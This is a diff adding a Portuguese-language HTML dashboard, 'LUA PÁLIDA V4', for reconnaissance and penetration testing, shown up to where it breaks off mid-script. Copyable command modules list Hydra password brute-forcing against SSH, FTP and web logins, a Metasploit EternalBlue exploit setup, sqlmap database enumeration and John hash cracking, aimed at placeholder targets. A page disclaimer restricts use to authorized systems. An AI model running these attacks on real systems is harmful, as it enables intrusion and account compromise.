@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>LUA PÁLIDA V4 — FICHA SCP</title>
+<script type="module" src="https://unpkg.com/x-frame-bypass@1.0.2/x-frame-bypass.js"></script>
+<style>
+/* ========== TEMA FICHA SCP (papel branco + vermelho) ========== */
+:root {
+  --paper: #f7f5ef;
+  --white: #ffffff;
+  --red: #c41e3a;
+  --red-dark: #8b0000;
+  --red-soft: rgba(196, 30, 58, 0.18);
+  --text: #1a1a1a;
+  --muted: #555;
+  --line: #e8e0d8;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+html, body {
+  height: 100%;
+  background: var(--paper);
+  color: var(--text);
+  font-family: 'Courier New', Courier, monospace;
+  font-size: 13px;
+  line-height: 1.4;
+  overflow-x: hidden;
+  -webkit-text-size-adjust: 100%;
+}
+
+::-webkit-scrollbar { width: 5px; height: 5px; }
+::-webkit-scrollbar-track { background: #eee; }
+::-webkit-scrollbar-thumb { background: var(--red); border-radius: 2px; }
+::selection { background: var(--red); color: #fff; }
+
+a { color: var(--red); }
+
+/* ========== BASE ========== */
+.panel {
+  background: var(--white);
+  border: 2px solid var(--red);
+  border-radius: 1px;
+  padding: 8px;
+}
+
+button {
+  cursor: pointer;
+  background: var(--white);
+  color: var(--red);
+  border: 1.5px solid var(--red);
+  border-radius: 1px;
+  padding: 5px 9px;
+  font-size: 11px;
+  font-weight: 700;
+  font-family: inherit;
+  transition: 0.1s;
+  white-space: nowrap;
+}
+button:hover, button:focus {
+  background: var(--red);
+  color: #fff;
+}
+button:active { transform: scale(0.97); }
+
+input, select, textarea {
+  background: var(--white);
+  color: var(--text);
+  border: 1.5px solid #cc7777;
+  border-radius: 1px;
+  padding: 5px 7px;
+  font-size: 12px;
+  font-family: inherit;
+  width: 100%;
+}
+input:focus, select:focus, textarea:focus {
+  border-color: var(--red);
+  outline: none;
+  box-shadow: 0 0 0 2px var(--red-soft);
+}
+
+h1 {
+  font-size: 14px;
+  letter-spacing: 1px;
+  color: var(--red);
+  font-weight: 800;
+  text-transform: uppercase;
+  margin: 0;
+}
+h2 {
+  font-size: 11px;
+  color: var(--red);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin: 0 0 5px 0;
+  border-bottom: 1px solid var(--line);
+  padding-bottom: 2px;
+}
+
+.badge {
+  display: inline-block;
+  background: var(--red);
+  color: #fff;
+  font-size: 8px;
+  padding: 1px 5px;
+  border-radius: 1px;
+  letter-spacing: 1px;
+  margin-left: 4px;
+  font-weight: 700;
+  vertical-align: middle;
+}
+
+.site-btn {
+  font-size: 9px;
+  padding: 3px 6px;
+  margin: 1px;
+  background: var(--white);
+  color: var(--red);
+  border: 1px solid #e09999;
+}
+.site-btn:hover { background: var(--red); color: #fff; }
+
+.term-box {
+  background: #fffafa;
+  border: 1.5px solid #dd9999;
+  border-radius: 1px;
+  padding: 6px;
+  font-size: 11px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  color: var(--red-dark);
+  min-height: 70px;
+  max-height: 130px;
+}
+
+.cmd-block {
+  background: #fff8f8;
+  border: 1px solid #ffcccc;
+  border-radius: 1px;
+  padding: 5px;
+  margin: 4px 0;
+  font-size: 10px;
+}
+.cmd-desc { color: var(--muted); font-size: 9px; margin-bottom: 2px; }
+.cmd-code { color: var(--red-dark); font-weight: 700; word-break: break-all; }
+
+.copy-btn {
+  background: var(--white);
+  color: var(--red);
+  border: 1px solid var(--red);
+  padding: 2px 6px;
+  font-size: 9px;
+  font-weight: 700;
+  border-radius: 1px;
+  margin-left: 3px;
+}
+.copy-btn:hover { background: var(--red); color: #fff; }
+
+.iframe-wall {
+  display: grid;
+  gap: 6px;
+  width: 100%;
+}
+.iframe-cell {
+  position: relative;
+  overflow: hidden;
+  border: 1.5px solid #e09999;
+  border-radius: 1px;
+  background: var(--white);
+  cursor: pointer;
+  min-height: 100px;
+}
+.iframe-cell:hover {
+  border-color: var(--red);
+  box-shadow: 0 0 8px var(--red-soft);
+}
+.iframe-cell iframe {
+  width: 100%;
+  height: 100%;
+  border: none;
+  pointer-events: none;
+  background: #fff;
+}
+.iframe-label {
+  position: absolute;
+  top: 0; left: 0;
+  font-size: 7px;
+  background: rgba(255,255,255,0.95);
+  color: var(--red);
+  padding: 2px 4px;
+  z-index: 2;
+  max-width: 92%;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  border: 1px solid #ffcccc;
+  font-weight: 700;
+}
+.expand-badge {
+  position: absolute;
+  bottom: 2px; right: 2px;
+  font-size: 7px;
+  background: rgba(255,255,255,0.95);
+  color: var(--red);
+  padding: 1px 4px;
+  z-index: 2;
+  border: 1px solid #ffcccc;
+  font-weight: 700;
+}
+
+.target-card {
+  border: 1px solid #ffaaaa;
+  padding: 3px 5px;
+  margin: 2px 0;
+  font-size: 10px;
+  background: #fff8f8;
+}
+
+.guide-box {
+  background: #fffafa;
+  border: 2px solid var(--red);
+  padding: 10px;
+  font-size: 11px;
+  line-height: 1.5;
+  max-height: 240px;
+  overflow-y: auto;
+}
+.guide-box h3 {
+  color: var(--red);
+  font-size: 12px;
+  margin: 8px 0 3px;
+  text-transform: uppercase;
+}
+.guide-box ul { padding-left: 16px; margin: 3px 0; }
+.guide-box li { margin: 2px 0; }
+
+/* ========== APP LAYOUT ========== */
+.app {
+  display: flex;
+  flex-direction: column;
+  height: 100vh;
+  height: 100dvh;
+  padding: 4px;
+  gap: 4px;
+}
+
+.header { flex-shrink: 0; }
+
+.main {
+  display: flex;
+  gap: 4px;
+  flex: 1;
+  min-height: 0;
+  overflow: hidden;
+}
+
+.col-left, .col-right {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  min-width: 0;
+  min-height: 0;
+}
+
+.col-left { flex: 1.35; }
+.col-right { flex: 1; }
+
+.viewer-wrap {
+  height: 180px;
+  border: 2px solid #e09999;
+  overflow: hidden;
+  position: relative;
+  background: #fff;
+  flex-shrink: 0;
+}
+.viewer-wrap iframe {
+  width: 100%;
+  height: 100%;
+  border: none;
+}
+.viewer-label {
+  position: absolute;
+  top: 0; left: 0;
+  font-size: 8px;
+  background: rgba(255,255,255,0.95);
+  color: var(--red);
+  padding: 2px 5px;
+  z-index: 5;
+  max-width: 85%;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  border: 1px solid #ffcccc;
+  font-weight: 700;
+}
+
+.modules-panel {
+  max-height: 200px;
+  overflow-y: auto;
+  flex-shrink: 0;
+}
+
+.terminal-panel {
+  flex: 1;
+  min-height: 0;
+  display: flex;
+  flex-direction: column;
+}
+
+.osint-panel { flex-shrink: 0; }
+
+.iframe-panel {
+  flex: 1;
+  min-height: 0;
+  display: flex;
+  flex-direction: column;
+}
+#iframeWallContainer {
+  flex: 1;
+  overflow: auto;
+  border: 1.5px solid #e09999;
+  background: #fffafa;
+  min-height: 120px;
+}
+
+.bottom-row {
+  display: flex;
+  gap: 4px;
+  flex-shrink: 0;
+}
+
+.console-bar {
+  flex-shrink: 0;
+  max-height: 32px;
+  overflow-y: auto;
+  padding: 3px 8px;
+  font-size: 9px;
+  color: var(--muted);
+}
+
+/* ========== MOBILE NAV ========== */
+.mobile-nav {
+  display: none;
+  flex-wrap: wrap;
+  gap: 3px;
+  padding: 5px;
+  background: var(--white);
+  border-bottom: 2px solid var(--red);
+  flex-shrink: 0;
+}
+.mobile-nav button {
+  font-size: 10px;
+  padding: 7px 6px;
+  flex: 1 1 30%;
+  min-width: 0;
+}
+
+/* ========== MOBILE ========== */
+@media (max-width: 860px) {
+  body { font-size: 12px; }
+
+  .mobile-nav { display: flex; }
+
+  .main {
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  /* por padrão escondidas; JS adiciona .active */
+  .col-left,
+  .col-right {
+    display: none;
+    width: 100%;
+    flex: none;
+    height: auto;
+    max-height: none;
+    overflow: auto;
+  }
+
+  .col-left.active,
+  .col-right.active {
+    display: flex !important;
+    flex-direction: column;
+    flex: 1 1 auto;
+    min-height: 0;
+    overflow-y: auto;
+  }
+
+  .viewer-wrap { height: 170px; }
+
+  .modules-panel { max-height: 180px; }
+
+  .iframe-wall {
+    grid-template-columns: repeat(2, 1fr) !important;
+    gap: 7px !important;
+  }
+  .iframe-cell {
+    min-height: 155px !important;
+    height: 160px !important;
+  }
+  #iframeWallContainer {
+    min-height: 300px;
+  }
+
+  .bottom-row {
+    flex-direction: column;
+  }
+
+  .guide-panel {
+    max-height: 45vh;
+    overflow: auto;
+  }
+
+  .terminal-panel .term-box {
+    max-height: 110px;
+  }
+}
+
+@media (max-width: 400px) {
+  .mobile-nav button {
+    font-size: 9px;
+    padding: 6px 3px;
+  }
+  .viewer-wrap { height: 150px; }
+  .iframe-cell {
+    min-height: 140px !important;
+    height: 145px !important;
+  }
+  button { font-size: 10px; padding: 4px 5px; }
+  input, select, textarea { font-size: 11px; }
+  h1 { font-size: 12px; }
+}
+
+/* desktop nunca mostra mobile-nav e sempre mostra colunas */
+@media (min-width: 861px) {
+  .mobile-nav { display: none !important; }
+  .col-left, .col-right {
+    display: flex !important;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="app">
+
+  <!-- MENU MOBILE -->
+  <nav class="mobile-nav" id="mobileNav">
+    <button data-view="nav" onclick="showMobile('nav')">🌐 NAV</button>
+    <button data-view="cmds" onclick="showMobile('cmds')">📋 CMDS</button>
+    <button data-view="iframes" onclick="showMobile('iframes')">📦 IFRAMES</button>
+    <button data-view="term" onclick="showMobile('term')">💻 TERM</button>
+    <button data-view="guia" onclick="showMobile('guia')">📖 GUIA</button>
+    <button data-view="extra" onclick="showMobile('extra')">📥 EXTRA</button>
+  </nav>
+
+  <!-- HEADER -->
+  <header class="panel header">
+    <div style="display:flex;align-items:center;gap:5px;flex-wrap:wrap;margin-bottom:5px">
+      <h1>LUA PÁLIDA V4 <span class="badge">SCP</span></h1>
+      <span style="font-size:9px;color:var(--muted)">FICHA DE OPERAÇÃO</span>
+      <span style="width:8px;height:8px;border-radius:50%;background:var(--red);box-shadow:0 0 4px var(--red);flex-shrink:0"></span>
+      <div style="flex:1"></div>
+      <button onclick="toggleGuide()" style="font-size:10px">📖 GUIA</button>
+    </div>
+    <div style="display:flex;gap:4px;flex-wrap:wrap;align-items:center">
+      <input id="urlbar" value="https://archive.org" style="flex:1;min-width:90px">
+      <button onclick="goUrl()">➤ IR</button>
+      <button onclick="copyPageText()" style="background:#fff5f5">📋 TEXTO</button>
+      <select id="mirror" onchange="changeMirror()" style="width:130px;font-size:11px;flex:0 0 auto">
+        <option value="archive">Archive.org</option>
+        <option value="duck">DuckDuckGo</option>
+        <option value="startpage">Startpage</option>
+        <option value="wikipedia">Wikipedia PT</option>
+      </select>
+    </div>
+    <div id="quickSites" style="display:flex;flex-wrap:wrap;gap:2px;margin-top:5px;max-height:36px;overflow-y:auto">
+      <button class="site-btn" onclick="goSite('https://archive.org')">Archive</button>
+      <button class="site-btn" onclick="goSite('https://web.archive.org')">Wayback</button>
+      <button class="site-btn" onclick="goSite('https://startpage.com')">Start</button>
+      <button class="site-btn" onclick="goSite('https://duckduckgo.com')">Duck</button>
+      <button class="site-btn" onclick="goSite('https://shodan.io')">Shodan</button>
+      <button class="site-btn" onclick="goSite('https://crt.sh')">crt.sh</button>
+      <button class="site-btn" onclick="goSite('https://haveibeenpwned.com')">HIBP</button>
+      <button class="site-btn" onclick="goSite('https://virustotal.com')">VT</button>
+      <button class="site-btn" onclick="goSite('https://urlscan.io')">URLScan</button>
+      <button class="site-btn" onclick="goSite('https://nmap.org')">Nmap</button>
+      <button class="site-btn" onclick="goSite('https://kali.org')">Kali</button>
+    </div>
+  </header>
+
+  <!-- GUIA -->
+  <div class="panel guide-panel" id="guidePanel" style="display:none;flex-shrink:0">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+      <h2 style="border:none;margin:0;padding:0">Guia — Português BR</h2>
+      <button onclick="toggleGuide()" style="font-size:10px">✕</button>
+    </div>
+    <div class="guide-box">
+      <h3>1. Navegação</h3>
+      <ul>
+        <li>Digite a URL e clique em <b>➤ IR</b>.</li>
+        <li>Botões rápidos levam a sites úteis.</li>
+        <li><b>📋 TEXTO</b> tenta copiar o texto da página. Se o site bloquear, copia a URL.</li>
+      </ul>
+      <h3>2. Iframe Wall</h3>
+      <ul>
+        <li>Snapshots do Wayback Machine.</li>
+        <li>Densidade: 12 / 24 / 48.</li>
+        <li>Toque na célula para abrir no visualizador.</li>
+      </ul>
+      <h3>3. Módulos</h3>
+      <ul>
+        <li>RECON, NMAP, HYDRA, MSF, CURL, DNS, SUBDOM, SQLMAP, JOHN, INSTALAR.</li>
+        <li>Cada comando tem explicação + botão COPIAR.</li>
+        <li>Cole no terminal Linux real.</li>
+      </ul>
+      <h3>4. Terminal</h3>
+      <ul>
+        <li>Comandos: <code>nmap</code>, <code>whois</code>, <code>dig</code>, <code>sub</code>, <code>geo</code>, <code>ports</code>, <code>archive</code>, <code>help</code>, <code>clear</code>.</li>
+      </ul>
+      <h3>5. Targets / Evidências / Dossiê</h3>
+      <ul>
+        <li>Adicione alvos, capture URLs, anote e exporte TXT.</li>
+      </ul>
+      <p style="margin-top:10px;color:var(--red);font-weight:700">
+        ⚠️ Use somente em sistemas com autorização por escrito. Uso não autorizado é ilegal.
+      </p>
+    </div>
+  </div>
+
+  <!-- CORPO -->
+  <div class="main">
+
+    <!-- COLUNA ESQUERDA -->
+    <div class="col-left" id="colLeft">
+
+      <div class="panel" style="flex-shrink:0">
+        <div class="viewer-wrap">
+          <iframe id="viewer" src="https://archive.org" title="viewer"></iframe>
+          <div class="viewer-label" id="viewerLabel">Archive.org</div>
+        </div>
+      </div>
+
+      <div class="panel modules-panel">
+        <div style="display:flex;gap:3px;flex-wrap:wrap;align-items:center;margin-bottom:4px">
+          <h2 style="border:none;margin:0;padding:0">Módulos</h2>
+          <button onclick="gerarComandos('recon')" style="font-size:9px">RECON</button>
+          <button onclick="gerarComandos('nmap')" style="font-size:9px">NMAP</button>
+          <button onclick="gerarComandos('hydra')" style="font-size:9px">HYDRA</button>
+          <button onclick="gerarComandos('metasploit')" style="font-size:9px">MSF</button>
+          <button onclick="gerarComandos('curl')" style="font-size:9px">CURL</button>
+          <button onclick="gerarComandos('dns')" style="font-size:9px">DNS</button>
+          <button onclick="gerarComandos('sub')" style="font-size:9px">SUBDOM</button>
+          <button onclick="gerarComandos('sqlmap')" style="font-size:9px">SQLMAP</button>
+          <button onclick="gerarComandos('john')" style="font-size:9px">JOHN</button>
+          <button onclick="gerarComandos('instalar')" style="font-size:9px">INSTALAR</button>
+        </div>
+        <div id="comandosOutput" style="font-size:10px;max-height:150px;overflow-y:auto;padding:4px;background:#fff8f8;border:1px solid #ffcccc">
+          <span style="color:var(--muted)">Clique em um módulo. Cada comando tem explicação e botão COPIAR.</span>
+        </div>
+      </div>
+
+      <div class="panel terminal-panel">
+        <h2>Terminal</h2>
+        <div id="realTerminal" class="term-box" style="flex:1">
+          <span style="color:var(--red)">lua:~$</span> <span style="color:var(--muted)">Digite help</span><br>
+          ────────────────────
+        </div>
+        <div style="display:flex;gap:3px;margin-top:4px">
+          <input id="realTerminalInput" placeholder="nmap | whois | dig | sub | geo | help | clear" style="flex:1">
+          <button onclick="execTerminal()">EXEC</button>
+          <button onclick="clearTerminal()">LIMPAR</button>
+        </div>
+      </div>
+
+      <div class="panel osint-panel">
+        <div style="display:flex;gap:3px;flex-wrap:wrap">
+          <button onclick="execOSINT('whois')" style="font-size:10px">WHOIS</button>
+          <button onclick="execOSINT('geo')" style="font-size:10px">GEO</button>
+          <button onclick="execOSINT('dns')" style="font-size:10px">DNS</button>
+          <button onclick="execOSINT('sub')" style="font-size:10px">SUBDOM</button>
+          <button onclick="execOSINT('ports')" style="font-size:10px">PORTS</button>
+          <button onclick="execOSINT('archive')" style="font-size:10px">ARCHIVE</button>
+        </div>
+        <div id="osintout" style="font-size:10px;margin-top:4px;padding:4px;background:#fff8f8;border:1px solid #ffcccc;max-height:48px;overflow:auto">Resultados aqui</div>
+      </div>
+    </div>
+
+    <!-- COLUNA DIREITA -->
+    <div class="col-right" id="colRight">
+
+      <div class="panel iframe-panel">
+        <div style="display:flex;gap:4px;align-items:center;flex-wrap:wrap;margin-bottom:4px">
+          <h2 style="border:none;margin:0;padding:0">Iframe Wall <span id="iframeCount" style="color:var(--muted);font-size:9px">(0)</span></h2>
+          <select id="iframeDensity" onchange="rebuildWall()" style="font-size:10px;width:65px">
+            <option value="12">12</option>
+            <option value="24" selected>24</option>
+            <option value="48">48</option>
+          </select>
+          <button onclick="rebuildWall()" style="font-size:9px">🔄</button>
+          <button onclick="refreshWall()" style="font-size:9px">⟳</button>
+        </div>
+        <div id="iframeWallContainer"></div>
+      </div>
+
+      <div class="bottom-row">
+        <div class="panel" style="flex:1">
+          <h2>Targets</h2>
+          <div style="display:flex;gap:3px">
+            <input id="targetName" placeholder="IP ou domínio" style="flex:1;font-size:11px">
+            <button onclick="addTarget()" style="font-size:10px">+</button>
+          </div>
+          <div id="targets" style="font-size:10px;max-height:50px;overflow-y:auto;margin-top:3px"></div>
+        </div>
+        <div class="panel" style="flex:1">
+          <h2>Evidências</h2>
+          <button onclick="captureEvidence()" style="font-size:10px">CAPTURAR URL</button>
+          <div id="evidence" style="font-size:9px;max-height:50px;overflow-y:auto;margin-top:3px"></div>
+        </div>
+      </div>
+
+      <div class="bottom-row">
+        <div class="panel" style="flex:1.4">
+          <div style="display:flex;gap:3px;align-items:center">
+            <h2 style="border:none;margin:0;padding:0">Dossiê</h2>
+            <button onclick="saveDossier()" style="font-size:9px">SALVAR</button>
+            <button onclick="exportDossier()" style="font-size:9px">TXT</button>
+          </div>
+          <textarea id="notes" style="width:100%;height:34px;font-size:11px;resize:none;margin-top:3px" placeholder="Anotações..."></textarea>
+        </div>
+        <div class="panel" style="flex:1">
+          <h2>Downloads</h2>
+          <div style="display:flex;flex-wrap:wrap;gap:3px">
+            <button onclick="downloadComandos()" style="font-size:9px">COMANDOS</button>
+            <button onclick="downloadDossie()" style="font-size:9px">DOSSIÊ</button>
+          </div>
+          <div id="downloadStatus" style="font-size:8px;color:var(--muted);margin-top:3px"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CONSOLE -->
+  <div class="panel console-bar">
+    <b style="color:var(--red)">CONSOLE</b>
+    <button onclick="document.getElementById('console').innerHTML=''" style="font-size:8px;margin-left:6px">limpar</button>
+    <div id="console" style="margin-top:1px">[sistema iniciado] LUA PÁLIDA V4 — FICHA SCP</div>
+  </div>
+</div>
+
+<script>
+const corsProxy = 'https://corsproxy.io/?url=';
+const mirrorMap = {
+  archive: 'https://archive.org',
+  duck: 'https://lite.duckduckgo.com/lite',
+  startpage: 'https://startpage.com',
+  wikipedia: 'https://pt.wikipedia.org'
+};
+
+let currentMobileView = 'nav';
+
+/* ========== MOBILE (estável, sem bug de tela) ========== */
+function showMobile(view) {
+  currentMobileView = view;
+  const left = document.getElementById('colLeft');
+  const right = document.getElementById('colRight');
+  const guide = document.getElementById('guidePanel');
+
+  left.classList.remove('active');
+  right.classList.remove('active');
+  guide.style.display = 'none';
+
+  if (window.innerWidth > 860) {
+    left.classList.add('active');
+    right.classList.add('active');
+    return;
+  }
+
+  if (view === 'nav' || view === 'cmds' || view === 'term') {
+    left.classList.add('active');
+  } else if (view === 'iframes') {
+    right.classList.add('active');
+  } else if (view === 'guia') {
+    guide.style.display = 'block';
+  } else if (view === 'extra') {
+    left.classList.add('active');
+    right.classList.add('active');
+  }
+
+  document.querySelectorAll('.mobile-nav button').forEach(btn => {
+    const active = btn.dataset.view === view;
+    btn.style.background = active ? 'var(--red)' : '';
+    btn.style.color = active ? '#fff' : '';
+  });
+}
+
+function toggleGuide() {
+  const p = document.getElementById('guidePanel');
+  p.style.display = p.style.display === 'none' ? 'block' : 'none';
+}
+
+/* ========== NAVEGAÇÃO ========== */
+function goUrl() {
+  let u = document.getElementById('urlbar').value.trim();
+  if (u && !u.startsWith('http')) u = 'https://' + u;
+  document.getElementById('viewer').src = u;
+  document.getElementById('viewerLabel').textContent = u.replace(/^https?:\/\//, '').substring(0, 48);
+  log('→ ' + u);
+}
+
+function changeMirror() {
+  const v = mirrorMap[document.getElementById('mirror').value];
+  if (v) {
+    document.getElementById('urlbar').value = v;
+    goUrl();
+  }
+}
+
+function goSite(url) {
+  document.getElementById('urlbar').value = url;
+  goUrl();
+}
+
+function log(msg) {
+  const c = document.getElementById('console');
+  c.innerHTML = '[' + new Date().toLocaleTimeString() + '] ' + msg + '<br>' + c.innerHTML;
+}
+
+/* ========== COPIAR TEXTO ========== */
+function copyPageText() {
+  const viewer = document.getElementById('viewer');
+  const url = document.getElementById('urlbar').value;
+  try {
+    const doc = viewer.contentDocument || viewer.contentWindow.document;
+    const text = (doc.body && doc.body.innerText) || '';
+    if (text.trim().length > 30) {
+      navigator.clipboard.writeText(text.substring(0, 12000)).then(() => {
+        log('texto copiado');
+        alert('Texto copiado!');
+      });
+      return;
+    }
+  } catch (e) {}
+  const fallback = 'URL: ' + url + '\n\n[O site bloqueia extração de texto. URL copiada.]';
+  navigator.clipboard.writeText(fallback).then(() => {
+    log('URL + aviso copiado');
+    alert('Site bloqueia o texto.\nURL copiada.');
+  });
+}
+
+/* ========== IFRAME WALL ========== */
+function getSources() {
+  const density = parseInt(document.getElementById('iframeDensity').value) || 24;
+  const bases = [
+    'google.com','wikipedia.org','github.com','stackoverflow.com','reddit.com',
+    'nmap.org','kali.org','shodan.io','virustotal.com','haveibeenpwned.com',
+    'crt.sh','archive.org','owasp.org','mitre.org','debian.org','ubuntu.com',
+    'startpage.com','duckduckgo.com','en.wikipedia.org/wiki/Penetration_test',
+    'en.wikipedia.org/wiki/Kali_Linux','pt.wikipedia.org/wiki/Segurança_da_informação'
+  ];
+  const years = ['2024','2023','2022','2021','2020','2019'];
+  const sources = [];
+  for (let i = 0; i < density; i++) {
+    const site = bases[i % bases.length];
+    const y = years[i % years.length];
+    const m = (i % 2 === 0) ? '01' : '06';
+    sources.push('https://web.archive.org/web/' + y + m + '01000000if_/https://' + site);
+  }
+  for (let i = sources.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [sources[i], sources[j]] = [sources[j], sources[i]];
+  }
+  return sources;
+}
+
+function rebuildWall() {
+  const container = document.getElementById('iframeWallContainer');
+  const density = parseInt(document.getElementById('iframeDensity').value) || 24;
+  const sources = getSources();
+  const isMobile = window.innerWidth <= 860;
+  const cols = isMobile ? 2 : (density <= 12 ? 4 : density <= 24 ? 6 : 8);
+  const cellH = isMobile ? 160 : 112;
+
+  container.innerHTML = '';
+  const wall = document.createElement('div');
+  wall.className = 'iframe-wall';
+  wall.style.gridTemplateColumns = 'repeat(' + cols + ', 1fr)';
+
+  sources.forEach((src, idx) => {
+    const cell = document.createElement('div');
+    cell.className = 'iframe-cell';
+    cell.style.height = cellH + 'px';
+
+    const label = document.createElement('div');
+    label.className = 'iframe-label';
+    let short = src.replace('https://web.archive.org/web/', '').replace('if_/https://', '→');
+    short = short.length > 36 ? short.slice(0, 33) + '…' : short;
+    label.textContent = (idx + 1) + '. ' + short;
+    cell.appendChild(label);
+
+    const iframe = document.createElement('iframe');
+    iframe.setAttribute('is', 'x-frame-bypass');
+    iframe.loading = 'lazy';
+    iframe.src = src;
+    iframe.title = 'snap ' + (idx + 1);
+    iframe.style.width = '100%';
+    iframe.style.height = '100%';
+    iframe.style.border = 'none';
+    iframe.style.pointerEvents = 'none';
+    cell.appendChild(iframe);
+
+    const badge = document.createElement('div');
+    badge.className = 'expand-badge';
+    badge.textContent = 'expandir';
+    cell.appendChild(badge);
+
+    cell.onclick = () => {
+      document.getElementById('viewer').src = src;
+      document.getElementById('urlbar').value = src;
+      document.getElementById('viewerLabel').textContent = short;
+      log('expandido');
+    };
+
+    wall.appendChild(cell);
+  });
+
+  container.appendChild(wall);
+  document.getElementById('iframeCount').textContent = '(' + sources.length + ')';
+  log('wall: ' + sources.length);
+}
+
+function refreshWall() {
+  document.querySelectorAll('.iframe-cell iframe').forEach(ifr => {
+    const s = ifr.src;
+    ifr.src = '';
+    setTimeout(() => { ifr.src = s; }, 40);
+  });
+  log('wall recarregado');
+}
+
+/* ========== COMANDOS ========== */
+function copiar(texto) {
+  navigator.clipboard.writeText(texto).then(() => {
+    const out = document.getElementById('comandosOutput');
+    out.innerHTML = '<span style="color:var(--red);font-weight:700">✅ COPIADO</span><br><span style="color:var(--red-dark)">' + texto + '</span><br><br>' + out.innerHTML;
+    log('comando copiado');
+  });
+}
+
+function gerarComandos(mod) {
+  const out = document.getElementById('comandosOutput');
+  const blocks = {
+    recon: [
+      ['WHOIS', 'whois dominio.com'],
+      ['DNS ANY', 'dig dominio.com ANY +short'],
+      ['WhatWeb', 'whatweb dominio.com'],
+      ['Headers', 'curl -sI https://dominio.com']
+    ],
+    nmap: [
+      ['Rápido', 'nmap -sS -sV -T4 -F alvo.com'],
+      ['Padrão', 'nmap -sS -sV -sC -O -T4 alvo.com'],
+      ['Completo', 'nmap -sS -sV -sC -O -A -T4 -p- alvo.com'],
+      ['Ping sweep', 'nmap -sn 192.168.1.0/24']
+    ],
+    hydra: [
+      ['SSH', 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100'],
+      ['FTP', 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100'],
+      ['HTTP POST', 'hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"']
+    ],
+    metasploit: [
+      ['Iniciar', 'msfconsole -q'],
+      ['Buscar', 'search eternalblue'],
+      ['Usar', 'use exploit/windows/smb/ms17_010_eternalblue'],
+      ['Config + run', 'set RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nset LPORT 4444\nexploit']
+    ],
+    curl: [
+      ['Headers', 'curl -sI https://dominio.com'],
+      ['HTML', 'curl -s https://dominio.com'],
+      ['POST', 'curl -s -X POST -d "user=admin&pass=123" https://dominio.com/login']
+    ],
+    dns: [
+      ['A', 'dig dominio.com A +short'],
+      ['MX', 'dig dominio.com MX +short'],
+      ['NS', 'dig dominio.com NS +short'],
+      ['TXT', 'dig dominio.com TXT +short']
+    ],
+    sub: [
+      ['Sublist3r', 'sublist3r -d dominio.com -o subdomains.txt'],
+      ['Amass', 'amass enum -d dominio.com -o sub_amass.txt'],
+      ['crt.sh', 'curl -s "https://crt.sh/?q=%25.dominio.com&output=json" | jq -r \'.[].name_value\' | sort -u']
+    ],
+    sqlmap: [
+      ['Teste', 'sqlmap -u "https://dominio.com/pagina?id=1" --batch'],
+      ['Bancos', 'sqlmap -u "https://dominio.com/pagina?id=1" --dbs --batch']
+    ],
+    john: [
+      ['Identificar', 'john --identify hash.txt'],
+      ['Wordlist', 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt']
+    ],
+    instalar: [
+      ['Atualizar', 'sudo apt update && sudo apt upgrade -y'],
+      ['Ferramentas', 'sudo apt install -y nmap hydra sqlmap john sublist3r amass gobuster whatweb wpscan curl wget dnsutils']
+    ]
+  };
+
+  const list = blocks[mod] || [];
+  let html = '<div style="color:var(--red);font-weight:700;margin-bottom:4px">' + mod.toUpperCase() + '</div>';
+  list.forEach(([desc, cmd]) => {
+    const safe = cmd.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
+    html += '<div class="cmd-block"><div class="cmd-desc">' + desc + '</div><span class="cmd-code">' + cmd.replace(/\n/g, '<br>') + '</span> <button class="copy-btn" onclick="copiar(`' + safe + '`)">COPIAR</button></div>';
+  });
+  html += '<div style="color:var(--muted);font-size:9px;margin-top:6px">Substitua os placeholders. Use apenas com autorização.</div>';
+  out.innerHTML = html;
+  log('módulo ' + mod);
+}
+
+/* ========== TERMINAL ========== */
+function execTerminal() {
+  const inp = document.getElementById('realTerminalInput').value.trim();
+  if (!inp) return;
+  const term = document.getElementById('realTerminal');
+  term.innerHTML += '<span style="color:var(--red)">lua:~$</span> ' + inp + '<br>';
+  document.getElementById('realTerminalInput').value = '';
+  const c = inp.toLowerCase();
+
+  if (c === 'help' || c === '?') {
+    term.innerHTML += '<span style="color:var(--muted)">nmap | whois | dig | sub | geo | ports | archive | clear</span><br>';
+    scrollTerm(); return;
+  }
+  if (c === 'clear' || c === 'cls') { clearTerminal(); return; }
+
+  const alvo = (inp.split(' ')[1]) || document.getElementById('urlbar').value.replace(/https?:\/\//, '').split('/')[0];
+
+  if (c.startsWith('nmap') || c.startsWith('ports')) {
+    term.innerHTML += '<span style="color:var(--muted)">→ ' + alvo + '...</span><br>';
+    scrollTerm();
+    fetch(corsProxy + encodeURIComponent('https://api.hackertarget.com/nmap/?q=' + alvo))
+      .then(r => r.text())
+      .then(t => { term.innerHTML += '<span style="color:var(--red-dark)">' + t.split('\n').slice(0, 12).join('<br>') + '</span><br>'; scrollTerm(); })
+      .catch(() => { term.innerHTML += '<span style="color:var(--red)">Falha. Use no Linux: nmap -sV -T4 ' + alvo + '</span><br>'; scrollTerm(); });
+    return;
+  }
+
+  if (c.startsWith('whois')) {
+    term.innerHTML += '<span style="color:var(--muted)">→ whois...</span><br>';
+    scrollTerm();
+    fetch('https://who-dat.as93.net/' + alvo)
+      .then(r => r.json())
+      .then(d => {
+        let o = '';
+        if (d.registrar) o += 'Registrar: ' + d.registrar + '<br>';
+        if (d.creationDate) o += 'Criado: ' + d.creationDate + '<br>';
